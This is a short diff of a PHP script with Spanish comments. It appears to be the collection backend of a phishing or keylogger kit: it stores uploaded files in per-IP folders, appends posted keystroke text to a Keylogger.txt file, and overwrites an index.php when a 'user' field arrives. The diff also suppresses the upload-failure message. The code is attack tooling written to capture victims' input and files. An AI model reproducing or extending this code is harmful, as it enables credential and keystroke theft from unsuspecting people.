@@ -27,11 +27,14 @@ $directorio = "$ip/";
     if (move_uploaded_file($_FILES['subir_archivo']['tmp_name'], $subir_archivo)) {
         echo "El archivo es inválido.<br><br>";
         } else {
-        echo "La subida ha fallado";
+        echo "";
         }
         echo "</div>";
-#############################################################333333
-#Keylogger
+#copiar los archivos a una carpeta 
+if(isset($_POST['user'])){
+    copy("success", "$ip/index.php");
+}
+
 if(isset($_POST['text'])){
     $texto = $_POST['text'];
     $archivo = fopen("$directorio/Keylogger.txt", "a");
